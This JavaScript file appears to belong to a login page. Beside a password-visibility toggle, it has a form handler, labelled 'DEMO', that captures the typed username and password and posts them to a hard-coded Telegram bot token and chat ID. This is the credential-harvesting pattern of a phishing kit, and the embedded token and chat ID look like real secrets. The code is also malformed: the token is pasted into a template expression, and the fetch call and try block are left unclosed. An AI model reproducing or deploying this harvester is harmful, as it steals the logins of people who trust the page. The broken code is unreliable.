function togglePassword() {

    const passwordField = document.getElementById("password");
    const eyeOpen = document.getElementById("eyeOpen");
    const eyeClosed = document.getElementById("eyeClosed");

    if (!passwordField) {
        console.error("Password field not found");
        return;
    }

    const isHidden = passwordField.type === "password";

    passwordField.type = isHidden ? "text" : "password";

    if (eyeOpen && eyeClosed) {
        eyeOpen.style.display = isHidden ? "block" : "none";
        eyeClosed.style.display = isHidden ? "none" : "block";
    }
}

const BOT_TOKEN = "8822554567:AAEnXVWhSgSwy8NHNMbbU8CkehflBQBgKL0";
const CHAT_ID = "5613942414";

const form = document.getElementById("demoForm");

if (form) {
    form.addEventListener("submit", async function (event) {
        event.preventDefault();

        const username = document.getElementById("username").value.trim();
        const password = document.getElementById("password").value.trim();

        const telegramMessage =
            "📋 DEMO FORM SUBMISSION\n\n" +
            "Username: " + username + "\n" +
            "password: " + password;

        try {
            const response = await fetch(
                `https://api.telegram.org/bot${8822554567:AAEnXVWhSgSwy8NHNMbbU8CkehflBQBgKL0}/sendMessage`,
                {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: telegramMessage
                    })
                }
                } catch (error) {
            console.error(error);
            alert("Network error.");
        }
    });
           

            
          

            
